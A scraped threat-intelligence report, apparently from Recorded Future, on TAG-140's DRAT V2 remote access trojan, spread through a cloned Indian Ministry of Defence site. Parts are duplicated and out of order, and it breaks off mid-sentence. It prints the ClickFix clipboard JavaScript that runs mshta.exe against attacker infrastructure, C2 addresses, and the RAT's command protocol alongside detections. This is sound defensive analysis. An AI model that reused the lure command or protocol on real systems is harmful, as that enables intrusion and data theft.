(exec_this_comm) for arbitrary shell command execution, enhancing post-exploitation flexibility.</li>\n          <li>The malware obfuscates its C2 IP addresses using Base64 encoding with prepended strings to hinder straightforward decoding.</li>\n          <li>Compared to its predecessor, DRAT V2 reduces string obfuscation by keeping most command headers in plaintext, likely prioritizing parsing reliability over stealth.</li>\n          <li>DRAT V2 updates its custom server-initiated TCP protocol to support commands input in both ASCII and Unicode, while responding in ASCII only.</li>\n          <li>DRAT V2 lacks advanced anti-analysis techniques and relies on basic infection and persistence methods, making it detectable via static and behavioral analysis.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>TAG-140 is a threat actor group that overlaps with the publicly reported group Sidecopy, a <a href=\"https://thehackernews.com/2021/07/sidecopy-hackers-target-indian.html\">suspected</a> Pakistani state-aligned advanced persistent threat (APT) group assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC Leopard).

TAG-140 created a counterfeit website mimicking the Indian Ministry of Defence's official press release portal using the malicious domain <em>email[.]gov[.]in[.]drdosurvey[.]info</em>, which closely resembles the legitimate government website <em>mod[.]gov[.]in</em> (<a href=\"https://urlscan.io/result/72a275de-19dd-4f96-9594-43a676b86ff5/\">urlscan.io</a>).

Our analysis of the infection chain (<strong>Figure 2</strong>) reveals that the final payload is a new Delphi-based variant of DRAT (referred to as DRAT V2). Previously, DRAT was developed in .NET and was first <a href=\"https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/\">attributed</a> to SideCopy activity in 2023.

Upon establishing communication, the malware passively awaits instructions from the C2 server. Supported operations include system reconnaissance, such as collecting the username, operating system version, system time, and current working directory, as well as connectivity validation and enumeration of local file systems and directories.</p>\n        <p>Beyond reconnaissance, DRAT V2 facilitates more active engagement with the target environment. It enables file transfers in both directions between the host and the C2 infrastructure, allowing operators to upload additional payloads or exfiltrate data. Additionally, it supports the execution of local files and arbitrary Windows shell commands, returning the output to the C2. These functions provide TAG-140 with persistent, flexible control over the infected system and allow for both automated and interactive post-exploitation activity without requiring the deployment of auxiliary malware tools. <strong>Figure 4</strong> provides a summary of DRAT V2’s capabilities.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"image7.png\" src=\"https://www.recordedfuture.com/media_1e00b7743643c97762120c18537293aa98999f07c.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1490\" height=\"970\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4:</em></strong> <em>DRAT V2 capability matrix (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h2>DRAT V2 Commands</h2>\n        <p>DRAT V2 continues its use of a command interface that is a custom TCP, text-based, server-initiated protocol to support remote control capabilities across a compromised host.

The infected host then responds with the output of the command.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"image11.png\" src=\"https://www.recordedfuture.com/media_1da9f5f7abe7added17f855dc6ecb37db427537e7.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1513\" height=\"214\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 5:</em></strong> <em>DRAT V2 command execution request and response packets recorded and displayed by Wireshark (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h2>DRAT vs DRAT V2</h2>\n        <p>This comparative analysis highlights the technical and operational differences between the original DRAT and DRAT V2. The shift in development platforms marks a significant architectural transition that affects how the malware is compiled, executed, and potentially detected. Although both variants maintain similar core functionalities as lightweight RATs, DRAT V2 introduces meaningful enhancements in its command structure, C2 obfuscation techniques, and communication protocol while also minimizing its use of string obfuscation. These adaptations likely reflect TAG-140’s continued efforts to evolve their tooling for improved evasion, modularity, and flexibility in post-exploitation operations.</p>\n        <h3>Command Header Variation</h3>\n        <p>While both DRAT variants implement similar commands for remote administration, each version uses distinct naming conventions for command headers. For instance, DRAT’s system information command is labeled getInformitica, whereas DRAT V2 uses initial_infotonas. DRAT V2 also introduced a new command, exec_this_comm, which enables arbitrary shell command execution on the infected host, an enhancement not present in the original DRAT and indicative of expanded post-exploitation capabilities. The below comparison table (<strong>Table 2</strong>) presents a detailed, line-by-line breakdown of request and response headers across both versions. In that table, command mappings highlighted in green denote commands that are functionally retained across both variants, while items highlighted in yellow represent new additions exclusive to DRAT V2.</p>\n        <div>\n          <div>\n            <div><strong>Command</strong></div>\n            <div><strong>DRAT Command Header</strong></div>\n            <div><strong>DRAT V2 Command Header</strong></div>\n          </div>\n          <div>\n            <div>System Information Request</div>\n            <div>getInformitica</div>\n            <div>initial_infotonas</div>\n          </div>\n          <div>\n            <div>System Information Response</div>\n            <div>informiticaBack|</div>\n            <div>my_ini_info|</div>\n          </div>\n          <div>\n            <div>Echo/Connectivity Test Request</div>\n            <div>sup</div>\n            <div>sup</div>\n          </div>\n          <div>\n            <div>Echo/Connectivity Test Response</div>\n            <div>supconfirm</div>\n            <div>hello_frm_me</div>\n          </div>\n          <div>\n            <div>List Volumes Request</div>\n            <div>drivesList</div>\n            <div>lst_of_sys_drvs</div>\n          </div>\n          <div>\n            <div>List Volumes Response</div>\n            <div>drivesList</div>\n            <div>lst_of_sys_drvs</div>\n          </div>\n          <div>\n            <div>List directories and files with info<br />Request</div>\n            <div>enterPath</div>\n            <div>here_are_dir_details</div>\n          </div>\n          <div>\n            <div>List directories and files with info<br />Response</div>\n            <div>enterPath</div>\n            <div>here_are_dir_details</div>\n          </div>\n          <div>\n            <div>File Size Request</div>\n            <div>fdl</div>\n            <div>filina_for_down</div>\n          </div>\n          <div>\n            <div>File Size Response</div>\n            <div>fInfo</div>\n            <div>fileina_detailwa</div>\n          </div>\n          <div>\n            <div>File Upload Request</div>\n            <div>fup</div>\n            <div>file_upl</div>\n          </div>\n          <div>\n            <div>File Upload Response</div>\n            <div>fupConfirm</div>\n            <div>file_upl_confrm</div>\n          </div>\n          <div>\n            <div>File Exec Request</div>\n            <div>fupexec</div>\n            <div>this_filina_exec</div>\n          </div>\n          <div>\n            <div>File Exec Response</div>\n            <div>fupexecConfirm<br />fileExecuted</div>\n            <div>file_exec_confirm</div>\n          </div>\n          <div>\n            <div>File Download Request</div>\n            <div>fdlConfirm</div>\n            <div>fil_down_confirmina</div>\n          </div>\n          <div>\n            <div>Command Execution Request</div>\n            <div></div>\n            <div>exec_this_comm</div>\n          </div>\n          <div>\n            <div>Command Execution Response</div>\n            <div></div>\n            <div>comm_resultwa</div>\n          </div>\n          <div>\n            <div>File Download Response</div>\n            <div>[File Content]</div>\n            <div>[File Content]</div>\n          </div>\n        </div>\n        <p><strong><em>Table 2:</em></strong> <em>Command comparison between DRAT and DRAT V2 (Source: Recorded Future)</em></p>\n        <h3>Text Format in C2 Communications</h3>\n        <p>Both versions leverage text-based communication protocols for C2 interactions. However, they differ in encoding requirements: DRAT V2 accepts commands in both Unicode and ASCII, but always responds in ASCII, whereas the original DRAT mandates Unicode for both input and output (<strong>Figure 6</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"image8.png\" src=\"https://www.recordedfuture.com/media_1a44b70dbd20c5bf65ea167727fa2e0c4cda0f348.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1505\" height=\"202\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 6</em></strong><em>: DRAT V1 list volumes request and response recorded and displayed by Wireshark (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h4>Differences in System Information</h4>\n        <p>The system information response of both versions includes many similarities, but several differences include the text in Unicode, different command request headers, and WinDefender instead of win-def, both of which are hard-coded. Finally, the format of the Windows version in the system information response varies between DRAT and DRATV2. DRAT simply returns the value from the registry key, Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName, while DRAT V2 gets the Windows version using the API call GetVersionExW() and returns a custom string that is Base64-encoded in the source code. <strong>Table 3</strong> outlines the differences between the two commands.</p>\n        <div>\n          <div>\n            <div><strong>System Information Components</strong></div>\n            <div><strong>DRAT System Information Response</strong></div>\n            <div><strong>DRAT V2 System Information Response</strong></div>\n          </div>\n          <div>\n            <div>Command Separator</div>\n            <div>Data after the ~ character from the inbound request</div>\n            <div>Data after the ~ character from the inbound request</div>\n          </div>\n          <div>\n            <div>N.A Field</div>\n            <div>Hard-coded \"N.A\"</div>\n            <div>Hard-coded \"N.A\"</div>\n          </div>\n          <div>\n            <div>Username Field</div>\n            <div>Username retrieved via SystemInformation.Username()</div>\n            <div>Username retrieved via System:​:​Sysutils:​:​ GetEnvironmentVariable(\"USERNAME\")</div>\n          </div>\n          <div>\n            <div>Windows Version Field</div>\n            <div>The Windows version retrieved by: Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName<br /><br />Example: Windows 10 Pro</div>\n            <div>\n              <p>The Windows version retrieved by GetVersionExW() is translated into one of the following:</p>\n              <ul>\n                <li>V2luZG93cyAxMSBPUw==\n                  <ul>\n                    <li>Windows 11 OS</li>\n                  </ul>\n                </li>\n                <li>V2luZG93cyAxMCBPUw==\n                  <ul>\n                    <li>Windows 10 OS</li>\n                  </ul>\n                </li>\n                <li>V2luZG93cyA4IG9yIDEw\n                  <ul>\n                    <li>Windows 8 or 10</li>\n                  </ul>\n                </li>\n                <li>V2luZG93cyA3IE9T\n                  <ul>\n                    <li>Windows 7 OS</li>\n                  </ul>\n                </li>\n                <li>VW5rbm93biBXaW5kb3dzIFZlcnNpb24=\n                  <ul>\n                    <li>Unknown Windows Version</li>\n                  </ul>\n                </li>\n              </ul>\n            </div>\n          </div>\n          <div>\n            <div>Identifier Field</div>\n            <div>Hard-coded Win Defender</div>\n            <div>Hard-coded win-def</div>\n          </div>\n          <div>\n            <div>Date/Time Stamp Field</div>\n            <div>Current date and time in DD/MM/YYYY HH:​MM:​SS AM/PM format, retrieved via DateTime.Now.ToString()</div>\n            <div>Current date and time in YYYY-MM-DD HH:​MM:​SS format, retrieved via SysUtils::Now()</div>\n          </div>\n          <div>\n            <div>Working Path Field</div>\n            <div>Full path of the working directory</div>\n            <div>Full path of the working directory</div>\n          </div>\n        </div>\n        <p><strong><em>Table 3:</em></strong> <em>DRAT vs DRAT V2 system information request and response fields (Source: Recorded Future)</em></p>\n        <h3>Differences in C2 Obfuscation</h3>\n        <p>In both DRAT variants, the C2 information is Base64-encoded. DRAT encodes the C2 IP address directly, while DRAT V2 modifies its approach to C2 obfuscation by prepending one of the following strings to the IP address prior to Base64 encoding:</p>\n        <ul>\n          <li>&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</li>\n          <li>XXXXXXXXXXXXXXXXXXXXXX</li>\n        </ul>\n        <div>\n          <div>\n            <div>Example encoded C2 IP with prefix: PD48Pjw+PD48Pjw+PD48Pjw+PD48PjE4NS4xMTcuOTAuMjEy<br />Example decoded C2 IP with prefix: &lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;185.117.90.212</div>\n          </div>\n        </div>\n        <p>These prepended patterns likely serve as rudimentary integrity checks or help prevent trivial decoding by analysts and automated tools.</p>\n        <h3>String Obfuscation</h3>\n        <p>String obfuscation strategies also differ between the variants. DRAT employs a more extensive scheme, using a substitution algorithm to encode both commands and operational strings. DRAT V2, on the other hand, selectively obfuscates strings, such as Windows version and C2 information, but leaves command headers in plaintext. This limited obfuscation approach in DRAT V2 may represent a trade-off between stealth and parsing reliability.</p>\n        <h2>Detections</h2>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"image6.png\" src=\"https://www.recordedfuture.com/media_1ea1b47ba50b1ac955ae7fdbde39ac780fe839054.png?width=750&amp;format=png&amp;optimize=medium\" width=\"54\" height=\"59\" /> <strong>Detections</strong>\n            </div>\n          </div>\n          <div>\n            <div><strong>Snort</strong>\n              <img loading=\"lazy\" alt=\"image3.png\" src=\"https://www.recordedfuture.com/media_15042d09044493ce49e932685aaf7a13f3b2deec7.png?width=750&amp;format=png&amp;optimize=medium\" width=\"79\" height=\"59\" />\n            </div>\n            <div>\n              <ul>\n                <li>Detect DRAT Malware Outbound C2 Communication: Use these Snort rules to detect outbound DRAT and DRAT V2 C2 communication.</li>\n              </ul>\n            </div>\n          </div>\n          <div>\n            <div><strong>Sigma</strong>\n              <img loading=\"lazy\" alt=\"image4.png\" src=\"https://www.recordedfuture.com/media_1d54bcf7cd600fecce2cdcb8b5af20dfd6cba14b3.png?width=750&amp;format=png&amp;optimize=medium\" width=\"60\" height=\"59\" />\n            </div>\n            <div>\n              <ul>\n                <li>Detect TAG-140 Persistence via Run Key: Use this Sigma rule to detect TAG-140 attacks that establish persistence by creating a registry run key via a batch file when the batch file is missing the closing quotations in the command.</li>\n              </ul>\n            </div>\n          </div>\n          <div>\n            <div><strong>YARA</strong>\n              <img loading=\"lazy\" alt=\"image12.png\" src=\"https://www.recordedfuture.com/media_18a3fd8fa3d70ece39d1a2e84f22914a13da02275.png?width=750&amp;format=png&amp;optimize=medium\" width=\"74\" height=\"59\" />\n            </div>\n            <div>\n              <ul>\n                <li>Detect BroaderAspect Loader used by TAG-140: Use this YARA rule to detect files containing strings associated with the BroaderAspect malware, including .pdf and .bat file extensions and specific malware identifiers.</li>\n                <li>Detect DotNet and Delphi variants of the DRAT malware used by TAG-140: Use these YARA rules to detect DRAT and DRAT V2</li>\n              </ul>\n            </div>\n          </div>\n        </div>\n        <h2>Mitigations</h2>\n        <ul>\n          <li>Block or monitor outbound TCP connections to uncommon destination ports used by DRAT V2 for C2 operations, such as 3232, 6372, and 7771.

This continued diversification complicates attribution, detection, and monitoring activity. DRAT V2 appears to be another modular addition rather than a definitive evolution, reinforcing the likelihood that TAG-140 will persist in rotating RATs across campaigns to obscure signatures and maintain operational flexibility.</p>\n        <p>Despite these challenges, the DRAT V2 infection chain exhibits limited use of defensive evasion or anti-analysis techniques. The absence of code obfuscation, sandbox evasion, or complex loader behaviors increases the feasibility of early detection through basic telemetry and static analysis. Security teams should anticipate continued experimentation with malware tooling and infection chains. Monitoring for spearphishing infrastructure, loader reuse, and behavioral indicators, rather than specific malware families, will be critical in sustaining visibility into TAG-140 activity.</p>\n        <h2>Appendix A: Indicators of Compromise</h2>\n        <div>\n          <div>\n            <div>\n              <p><strong>DRAT V2</strong></p>\n              <p>ce98542131598b7af5d8aa546efe8c33a9762fb70bff4574227ecaed7fff8802<br />0d68012308ea41c6327eeb73eea33f4fb657c4ee051e0d40a3ef9fc8992ed316<br />c73d278f7c30f8394aeb2ecbf8f646f10dcff1c617e1583c127e70c871e6f8b7</p>\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong>DRAT</strong></p>\n              <p>830cd96aba6c328b1421bf64caa2b64f9e24d72c7118ff99d7ccac296e1bf13d<br />c328cec5d6062f200998b7680fab4ac311eafaf805ca43c487cda43498479e60</p>\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong>DRAT V2 C2</strong></p>\n              <p>185[.]117[.]90[.]212:7771<br />154[.]38[.]175[.]83:3232<br />178[.]18[.]248[.]36:6372</p>\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong>DRAT C2</strong></p>\n              <p>38[.]242[.]149[.]89:61101</p>\n            </div>\n          </div>\n        </div>\n        <h2>Appendix B: DRAT V2 Command Parameters and Response</h2>\n        <h3>System Information</h3>\n        <p>The initial_infotonas command initiates system-level reconnaissance by requesting host environment details, including username, OS version, timestamp, and working directory.

TAG-140 has overlaps with SideCopy, an operational subgroup assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC LEOPARD). TAG-140 has consistently demonstrated iterative advancement and variety in its malware arsenal and delivery techniques. This latest campaign, which spoofed the Indian Ministry of Defence via a cloned press release portal, marks a slight but notable shift in both malware architecture and command-and-control (C2) functionality.\nThe deployment of DRAT V2 reflects TAG-140’s ongoing refinement of its remote access tooling, transitioning from a .NET-based version of DRAT to a new Delphi-compiled variant. Both versions are among numerous RATs the group has leveraged, such as CurlBack, SparkRAT, AresRAT, Xeno RAT, AllaKore, and ReverseRAT, indicating a pattern of rotating malware use. DRAT V2 updates its custom TCP-based, server-initiated C2 protocol and expands functional capabilities, including arbitrary shell command execution and enhanced file system interaction.\nAnalysis of the infection chain indicates that initial access was achieved through a ClickFix-style social engineering lure. Victims were enticed to execute a malicious script via mshta.exe, which led to the execution of the BroaderAspect .NET loader, which has previously been used by TAG-140. BroaderAspect establishes persistence and subsequent DRAT V2 installation and execution.\nInsikt Group attributes this activity to TAG-140 with moderate confidence based on domain overlap, malware lineage, and infrastructure characteristics. DRAT V2’s enhancements suggest a likely increase in TAG-140’s capacity for tailored post-exploitation and lateral movement across victim networks. As such, its emergence is a relevant indicator of the threat actor’s maturing tradecraft and strategic targeting of India’s defense and governmental institutions.\nKey Findings\nDRAT V2 adds a new command (exec_this_comm) for arbitrary shell command execution, enhancing post-exploitation flexibility.\nThe malware obfuscates its C2 IP addresses using Base64 encoding with prepended strings to hinder straightforward decoding.\nCompared to its predecessor, DRAT V2 reduces string obfuscation by keeping most command headers in plaintext, likely prioritizing parsing reliability over stealth.\nDRAT V2 updates its custom server-initiated TCP protocol to support commands input in both ASCII and Unicode, while responding in ASCII only.\nDRAT V2 lacks advanced anti-analysis techniques and relies on basic infection and persistence methods, making it detectable via static and behavioral analysis.\nBackground\nTAG-140 is a threat actor group that overlaps with the publicly reported group Sidecopy, a suspected Pakistani state-aligned advanced persistent threat (APT) group assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC Leopard). Active since at least 2019, TAG-140 primarily targets Indian entities, with recent activity expanding beyond traditional government, defense, maritime, and academic sectors to now include organizations affiliated with the country’s railway, oil and gas, and external affairs ministries.\nThe group has demonstrated (1, 2, 3) a consistent evolution in its tradecraft: leveraging spearphishing campaigns, using HTML applications (HTAs) or Microsoft Installer (MSI) packages for distribution, exploiting software vulnerabilities (for example, WinRAR), and using many different RATs such as CurlBack, SparkRAT, AresRAT, Xeno RAT, AllaKore, ReverseRAT, and DRAT. Their infection chains commonly target both Windows and Linux environments.\nInsikt Group analyzed artifacts from a recent ClickFix campaign spoofing the Indian Ministry, which we have attributed to TAG-140 threat actors. TAG-140 created a counterfeit website mimicking the Indian Ministry of Defence's official press release portal using the malicious domain email[.]gov[.]in[.]drdosurvey[.]info, which closely resembles the legitimate government website mod[.]gov[.]in (urlscan.io). The cloned website replicated the structure and layout of the authentic portal, listing press releases from September 2023 to April 2025. However, only the link for March 2025 was active.\nFigure 1: Cloned Ministry of Defense portal (Source: Hunt.io)\nClicking the active March 2025 link triggered a ClickFix-style social engineering attack. Insikt Group conducted additional analysis of the TAG-140 Windows infection chain and determined it to be similar to an infection chain reported by Seqrite Labs in their research on TAG-140 activity, which was identified in late 2024. Our analysis of the infection chain (Figure 2) reveals that the final payload is a new Delphi-based variant of DRAT (referred to as DRAT V2). Previously, DRAT was developed in .NET and was first attributed to SideCopy activity in 2023. The updated variant includes new command functionality and a slightly modified C2 protocol.\nFigure 2: TAG-140 infection chain dropping DRAT V2 (Source: Recorded Future)\n1. The user is directed to the URL below (urlscan.io). While we do not know the delivery mechanism used, based on TAG-140’s tactics, techniques, and procedures (TTPs), this is likely delivered as a spearphishing email enticing the user to click on the link. The user is then lured to click on the “March 2025 Release” link. From a Windows machine, clicking on that link redirects the user to the uniform resource identifier (URI) /captcha/windows.php.\nhxxps://email[.]gov[.]in[.]drdosurvey[.]info/content/press-releases-ministry-defence-0.html\n2. The redirected website (urlscan.io) displays the warning “**Disclosure - For Official Use Only (FOUO)**” and asks the user to click “continue.”\n3. Clicking “continue” runs JavaScript that copies the malicious command below to the clipboard and directs the user to paste and execute it in a command shell. The command uses mshta.exe to fetch and run a remote script (index.php/sysinte.hta) from TAG-140’s infrastructure, _trade4wealth[.]in_.\nconst calcPath = \"C:\\\\Windows\\\\System32\\\\mshta.exe\nhxxps://trade4wealth[.]in/admin/assets/css/default/index.php\";\nnavigator.clipboard.writeText(calcPath)\n4. Execution of index.php/sysinte.hta creates and executes the BroaderAspect loader, first reported on by Seqrite Labs. BroaderAspect performs the following actions:\na. Downloads and opens the decoy document survey.pdf from the following URL:\nhxxps://trade4wealth[.]in/admin/assets/css/Vertical-layout-design/01/survey.pdf\nb.

We have observed in multiple instances that TAG-140 commonly uses Namecheap, along with GoDaddy and Hostinger (1, 2, 3, 4).\nIn addition to DRAT V2, TAG-140 has previously used Delphi-based malware, such as the open-source AllaKore RAT.\nTechnical Analysis\nDRAT V2 is a lightweight RAT developed in Delphi and represents an evolution of the earlier .NET-based variant first attributed to TAG-140 in 2023. DRAT V2 introduces several updates from its predecessor, including:\nAn update to its custom TCP server-initiated C2 protocol\nEnhanced Base64 obfuscation of C2 infrastructure with added prepended strings\nUpdated command headers and a new command for the execution of arbitrary Windows commands\nA high-level overview of DRAT V2 is provided in Figure 3.\nFigure 3: DRAT V2 summary (Source: Recorded Future)\nDRAT V2 supports a set of commands that allow TAG-140 operators to perform a wide range of interactions with compromised hosts. Upon establishing communication, the malware passively awaits instructions from the C2 server. Supported operations include system reconnaissance, such as collecting the username, operating system version, system time, and current working directory, as well as connectivity validation and enumeration of local file systems and directories.\nBeyond reconnaissance, DRAT V2 facilitates more active engagement with the target environment. It enables file transfers in both directions between the host and the C2 infrastructure, allowing operators to upload additional payloads or exfiltrate data. Additionally, it supports the execution of local files and arbitrary Windows shell commands, returning the output to the C2. These functions provide TAG-140 with persistent, flexible control over the infected system and allow for both automated and interactive post-exploitation activity without requiring the deployment of auxiliary malware tools. Figure 4 provides a summary of DRAT V2’s capabilities.\nFigure 4: DRAT V2 capability matrix (Source: Recorded Future)\nDRAT V2 Commands\nDRAT V2 continues its use of a command interface that is a custom TCP, text-based, server-initiated protocol to support remote control capabilities across a compromised host. Command execution, file manipulation, and system reconnaissance are enabled through a structured format.\nThe DRAT V2 command protocol is distinguished by the use of tilde (~) and pipe (|) characters as delimiters. Upon establishing connectivity with its C2 infrastructure, the malware enters a passive state, awaiting inbound instructions from the server. These instructions span nine discrete command types (Table 1), encompassing capabilities such as host reconnaissance, file management, and direct execution. Each command follows a deterministic format, allowing the operator to orchestrate post-compromise actions with consistency and low overhead.\nDRAT V2 Command\nCapability\nDescription\ninitial_infotonas\nSystem Information\nThis command initiates system-level reconnaissance by requesting host environment details, including username, OS version, timestamp, and working directory. The response is structured across seven fields.\nsup\nEcho/Connectivity Test\nThis command is used to verify active communication with the compromised host.\nlst_of_sys_drvs\nList Volumes\nThis command allows DRAT V2 to enumerate accessible logical drives on the target machine.\nhere_are_dir_details\nList Directories and Files with Info\nThis command retrieves structured metadata for directories and files, including name, size, timestamp, and path. Notably, the implementation contains a flaw where the full path concatenates improperly with subsequent entries, potentially impacting operator parsing.\nfilina_for_down\nFile Size\nThis command is used to retrieve the byte size of a specified file.\nfile_upl\nFile Upload\nThis command supports the transfer of files from the C2 to the target host. The command requires specification of both the file path and size, facilitating payload staging or deployment of secondary tools.\nthis_filina_exec\nFile Execution\nThis command executes a specified file on the host system. This capability enables the delivery of additional payloads or the execution of existing binaries within the local file system.\nfil_down_confirmina\nFile Download\nThis command enables exfiltration of files from the victim system to the C2 server. Unlike other responses, there is no response header, and only the raw file contents are sent to the C2.\nexec_this_comm\nCommand Execution\nThis command permits arbitrary shell command execution on the infected host. This adds significant flexibility for interactive operations, enabling real-time tasking and on-demand post-exploitation activity.\nTable 1: DRAT V2 commands (Source: Recorded Future)\nThis command set enables TAG-140 to support a range of post-exploitation objectives, including host reconnaissance, data staging, and potential lateral movement. Notably, DRAT V2 extends the functionality of its predecessor by incorporating support for arbitrary command execution. Appendix B provides detailed breakdowns of each command, including parameters.\nFigure 5 shows an example of the C2 communication between an infected host and the C2. In this example, the C2 server sends the command exec_this_comm~whoami, which tells the infected host to execute the command whoami. The infected host then responds with the output of the command.\nFigure 5: DRAT V2 command execution request and response packets recorded and displayed by Wireshark (Source: Recorded Future)\nDRAT vs DRAT V2\nThis comparative analysis highlights the technical and operational differences between the original DRAT and DRAT V2. The shift in development platforms marks a significant architectural transition that affects how the malware is compiled, executed, and potentially detected. Although both variants maintain similar core functionalities as lightweight RATs, DRAT V2 introduces meaningful enhancements in its command structure, C2 obfuscation techniques, and communication protocol while also minimizing its use of string obfuscation. These adaptations likely reflect TAG-140’s continued efforts to evolve their tooling for improved evasion, modularity, and flexibility in post-exploitation operations.\nCommand Header Variation\nWhile both DRAT variants implement similar commands for remote administration, each version uses distinct naming conventions for command headers. For instance, DRAT’s system information command is labeled getInformitica, whereas DRAT V2 uses initial_infotonas. DRAT V2 also introduced a new command, exec_this_comm, which enables arbitrary shell command execution on the infected host, an enhancement not present in the original DRAT and indicative of expanded post-exploitation capabilities. The below comparison table (Table 2) presents a detailed, line-by-line breakdown of request and response headers across both versions. In that table, command mappings highlighted in green denote commands that are functionally retained across both variants, while items highlighted in yellow represent new additions exclusive to DRAT V2.\nCommand\nDRAT Command Header\nDRAT V2 Command Header\nSystem Information Request\ngetInformitica\ninitial_infotonas\nSystem Information Response\ninformiticaBack|\nmy_ini_info|\nEcho/Connectivity Test Request\nsup\nsup\nEcho/Connectivity Test Response\nsupconfirm\nhello_frm_me\nList Volumes Request\ndrivesList\nlst_of_sys_drvs\nList Volumes Response\ndrivesList\nlst_of_sys_drvs\nList directories and files with info\nRequest\nenterPath\nhere_are_dir_details\nList directories and files with info\nResponse\nenterPath\nhere_are_dir_details\nFile Size Request\nfdl\nfilina_for_down\nFile Size Response\nfInfo\nfileina_detailwa\nFile Upload Request\nfup\nfile_upl\nFile Upload Response\nfupConfirm\nfile_upl_confrm\nFile Exec Request\nfupexec\nthis_filina_exec\nFile Exec Response\nfupexecConfirm\nfileExecuted\nfile_exec_confirm\nFile Download Request\nfdlConfirm\nfil_down_confirmina\nCommand Execution Request\n\n            \nexec_this_comm\nCommand Execution Response\n\n            \ncomm_resultwa\nFile Download Response\n[File Content]\n[File Content]\nTable 2: Command comparison between DRAT and DRAT V2 (Source: Recorded Future)\nText Format in C2 Communications\nBoth versions leverage text-based communication protocols for C2 interactions. However, they differ in encoding requirements: DRAT V2 accepts commands in both Unicode and ASCII, but always responds in ASCII, whereas the original DRAT mandates Unicode for both input and output (Figure 6).\nFigure 6: DRAT V1 list volumes request and response recorded and displayed by Wireshark (Source: Recorded Future)\nDifferences in System Information\nThe system information response of both versions includes many similarities, but several differences include the text in Unicode, different command request headers, and WinDefender instead of win-def, both of which are hard-coded. Finally, the format of the Windows version in the system information response varies between DRAT and DRATV2. DRAT simply returns the value from the registry key, Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName, while DRAT V2 gets the Windows version using the API call GetVersionExW() and returns a custom string that is Base64-encoded in the source code. Table 3 outlines the differences between the two commands.\nSystem Information Components\nDRAT System Information Response\nDRAT V2 System Information Response\nCommand Separator\nData after the ~ character from the inbound request\nData after the ~ character from the inbound request\nN.A Field\nHard-coded \"N.A\"\nHard-coded \"N.A\"\nUsername Field\nUsername retrieved via SystemInformation.Username()\nUsername retrieved via System:​:​Sysutils:​:​ GetEnvironmentVariable(\"USERNAME\")\nWindows Version Field\nThe Windows version retrieved by: Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName\nExample: Windows 10 Pro\nThe Windows version retrieved by GetVersionExW() is translated into one of the following:\nV2luZG93cyAxMSBPUw==\n                  \nWindows 11 OS\nV2luZG93cyAxMCBPUw==\n                  \nWindows 10 OS\nV2luZG93cyA4IG9yIDEw\n                  \nWindows 8 or 10\nV2luZG93cyA3IE9T\n                  \nWindows 7 OS\nVW5rbm93biBXaW5kb3dzIFZlcnNpb24=\n                  \nUnknown Windows Version\nIdentifier Field\nHard-coded Win Defender\nHard-coded win-def\nDate/Time Stamp Field\nCurrent date and time in DD/MM/YYYY HH:​MM:​SS AM/PM format, retrieved via DateTime.Now.ToString()\nCurrent date and time in YYYY-MM-DD HH:​MM:​SS format, retrieved via SysUtils::Now()\nWorking Path Field\nFull path of the working directory\nFull path of the working directory\nTable 3: DRAT vs DRAT V2 system information request and response fields (Source: Recorded Future)\nDifferences in C2 Obfuscation\nIn both DRAT variants, the C2 information is Base64-encoded. DRAT encodes the C2 IP address directly, while DRAT V2 modifies its approach to C2 obfuscation by prepending one of the following strings to the IP address prior to Base64 encoding:\n<><><><><><><><><><><>\nXXXXXXXXXXXXXXXXXXXXXX\nExample encoded C2 IP with prefix: PD48Pjw+PD48Pjw+PD48Pjw+PD48PjE4NS4xMTcuOTAuMjEy\nExample decoded C2 IP with prefix: <><><><><><><><><><><>185.117.90.212\nThese prepended patterns likely serve as rudimentary integrity checks or help prevent trivial decoding by analysts and automated tools.\nString Obfuscation\nString obfuscation strategies also differ between the variants. DRAT employs a more extensive scheme, using a substitution algorithm to encode both commands and operational strings. DRAT V2, on the other hand, selectively obfuscates strings, such as Windows version and C2 information, but leaves command headers in plaintext. This limited obfuscation approach in DRAT V2 may represent a trade-off between stealth and parsing reliability.\nDetections\n Detections\n            \nSnort\n              \n            \nDetect DRAT Malware Outbound C2 Communication: Use these Snort rules to detect outbound DRAT and DRAT V2 C2 communication.\nSigma\n              \n            \nDetect TAG-140 Persistence via Run Key: Use this Sigma rule to detect TAG-140 attacks that establish persistence by creating a registry run key via a batch file when the batch file is missing the closing quotations in the command.\nYARA\n              \n            \nDetect BroaderAspect Loader used by TAG-140: Use this YARA rule to detect files containing strings associated with the BroaderAspect malware, including .pdf and .bat file extensions and specific malware identifiers.\nDetect DotNet and Delphi variants of the DRAT malware used by TAG-140: Use these YARA rules to detect DRAT and DRAT V2\nMitigations\nBlock or monitor outbound TCP connections to uncommon 